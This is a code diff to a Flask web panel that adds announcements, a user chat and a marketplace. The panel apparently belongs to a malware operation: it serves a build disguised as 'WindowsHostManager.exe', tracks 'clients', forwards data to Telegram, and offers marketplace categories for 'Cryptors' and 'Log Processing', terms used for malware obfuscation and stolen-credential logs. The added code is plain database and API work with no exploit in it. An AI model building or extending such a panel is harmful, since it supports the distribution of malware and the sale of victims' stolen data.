@@ -167,6 +167,39 @@ def init_db():
         if 'user_id' not in client_cols:
             db.execute("ALTER TABLE clients ADD COLUMN user_id INTEGER")
 
+        db.execute('''
+            CREATE TABLE IF NOT EXISTS announcements (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                title TEXT NOT NULL,
+                body TEXT NOT NULL,
+                author_id INTEGER NOT NULL,
+                pinned INTEGER DEFAULT 0,
+                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+            )
+        ''')
+        db.execute('''
+            CREATE TABLE IF NOT EXISTS chat_messages (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                user_id INTEGER NOT NULL,
+                message TEXT NOT NULL,
+                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+            )
+        ''')
+        db.execute('''
+            CREATE TABLE IF NOT EXISTS marketplace_items (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                seller_id INTEGER NOT NULL,
+                title TEXT NOT NULL,
+                description TEXT NOT NULL,
+                price TEXT,
+                currency TEXT DEFAULT 'USD',
+                category TEXT NOT NULL,
+                contact TEXT,
+                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
+                status TEXT DEFAULT 'active'
+            )
+        ''')
+
         for k, v in [
             ('tg_forward_enabled', 'false'), ('tg_bot_token', ''), ('tg_chat_id', ''),
             ('active_bg_theme', 'theme-default'), ('bg_blur_value', '15'), ('custom_bg_path', '')
@@ -1513,6 +1546,157 @@ def download_build(filename):
     if os.path.exists(path):
         return send_file(path, as_attachment=True, download_name='WindowsHostManager.exe')
     return 'Build file not found', 404
+
+# ── Hub: Announcements ──────────────────────────────────────────────────────
+
+@app.route('/api/hub/announcements', methods=['GET'])
+@login_required
+def get_announcements():
+    with get_db() as db:
+        rows = db.execute(
+            '''SELECT a.id, a.title, a.body, a.pinned, a.created_at,
+                      u.username AS author
+               FROM announcements a
+               JOIN users u ON u.id = a.author_id
+               ORDER BY a.pinned DESC, a.created_at DESC'''
+        ).fetchall()
+    return jsonify([dict(r) for r in rows])
+
+@app.route('/api/hub/announcements', methods=['POST'])
+@admin_required
+def post_announcement():
+    data = request.get_json() or {}
+    title = (data.get('title') or '').strip()
+    body = (data.get('body') or '').strip()
+    pinned = 1 if data.get('pinned') else 0
+    if not title or not body:
+        return jsonify({'error': 'title and body required'}), 400
+    with get_db() as db:
+        db.execute(
+            'INSERT INTO announcements (title, body, author_id, pinned) VALUES (?,?,?,?)',
+            (title, body, request.current_user['id'], pinned)
+        )
+        db.commit()
+    return jsonify({'success': True})
+
+@app.route('/api/hub/announcements/<int:ann_id>', methods=['DELETE'])
+@admin_required
+def delete_announcement(ann_id):
+    with get_db() as db:
+        db.execute('DELETE FROM announcements WHERE id = ?', (ann_id,))
+        db.commit()
+    return jsonify({'success': True})
+
+# ── Hub: Chat ────────────────────────────────────────────────────────────────
+
+@app.route('/api/hub/chat', methods=['GET'])
+@login_required
+def get_chat():
+    since = request.args.get('since', 0, type=int)
+    with get_db() as db:
+        rows = db.execute(
+            '''SELECT m.id, m.message, m.created_at, u.username
+               FROM chat_messages m
+               JOIN users u ON u.id = m.user_id
+               WHERE m.id > ?
+               ORDER BY m.created_at ASC
+               LIMIT 200''',
+            (since,)
+        ).fetchall()
+    return jsonify([dict(r) for r in rows])
+
+@app.route('/api/hub/chat', methods=['POST'])
+@login_required
+def post_chat():
+    data = request.get_json() or {}
+    message = (data.get('message') or '').strip()
+    if not message or len(message) > 2000:
+        return jsonify({'error': 'invalid message'}), 400
+    with get_db() as db:
+        cur = db.execute(
+            'INSERT INTO chat_messages (user_id, message) VALUES (?,?)',
+            (request.current_user['id'], message)
+        )
+        db.commit()
+        row = db.execute(
+            '''SELECT m.id, m.message, m.created_at, u.username
+               FROM chat_messages m JOIN users u ON u.id = m.user_id
+               WHERE m.id = ?''',
+            (cur.lastrowid,)
+        ).fetchone()
+    return jsonify(dict(row))
+
+# ── Hub: Marketplace ─────────────────────────────────────────────────────────
+
+MARKETPLACE_CATEGORIES = {'Clients', 'Log Processing', 'Cryptors', 'Softs', 'Offers'}
+
+@app.route('/api/hub/marketplace', methods=['GET'])
+@login_required
+def get_marketplace():
+    category = request.args.get('category', '')
+    if category and category not in MARKETPLACE_CATEGORIES:
+        return jsonify({'error': 'invalid category'}), 400
+    with get_db() as db:
+        if category:
+            rows = db.execute(
+                '''SELECT m.id, m.title, m.description, m.price, m.currency,
+                          m.category, m.contact, m.created_at, m.status,
+                          u.username AS seller
+                   FROM marketplace_items m
+                   JOIN users u ON u.id = m.seller_id
+                   WHERE m.status = 'active' AND m.category = ?
+                   ORDER BY m.created_at DESC''',
+                (category,)
+            ).fetchall()
+        else:
+            rows = db.execute(
+                '''SELECT m.id, m.title, m.description, m.price, m.currency,
+                          m.category, m.contact, m.created_at, m.status,
+                          u.username AS seller
+                   FROM marketplace_items m
+                   JOIN users u ON u.id = m.seller_id
+                   WHERE m.status = 'active'
+                   ORDER BY m.created_at DESC'''
+            ).fetchall()
+    return jsonify([dict(r) for r in rows])
+
+@app.route('/api/hub/marketplace', methods=['POST'])
+@login_required
+def create_listing():
+    data = request.get_json() or {}
+    title = (data.get('title') or '').strip()
+    description = (data.get('description') or '').strip()
+    price = (data.get('price') or '').strip()
+    currency = (data.get('currency') or 'USD').strip()
+    category = (data.get('category') or '').strip()
+    contact = (data.get('contact') or '').strip()
+    if not title or not description or not category:
+        return jsonify({'error': 'title, description and category required'}), 400
+    if category not in MARKETPLACE_CATEGORIES:
+        return jsonify({'error': 'invalid category'}), 400
+    with get_db() as db:
+        db.execute(
+            '''INSERT INTO marketplace_items
+               (seller_id, title, description, price, currency, category, contact)
+               VALUES (?,?,?,?,?,?,?)''',
+            (request.current_user['id'], title, description, price, currency, category, contact)
+        )
+        db.commit()
+    return jsonify({'success': True})
+
+@app.route('/api/hub/marketplace/<int:item_id>', methods=['DELETE'])
+@login_required
+def delete_listing(item_id):
+    user = request.current_user
+    with get_db() as db:
+        item = db.execute('SELECT seller_id FROM marketplace_items WHERE id = ?', (item_id,)).fetchone()
+        if not item:
+            return jsonify({'error': 'not found'}), 404
+        if item['seller_id'] != user['id'] and user['role'] != 'admin':
+            return jsonify({'error': 'forbidden'}), 403
+        db.execute('DELETE FROM marketplace_items WHERE id = ?', (item_id,))
+        db.commit()
+    return jsonify({'success': True})
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
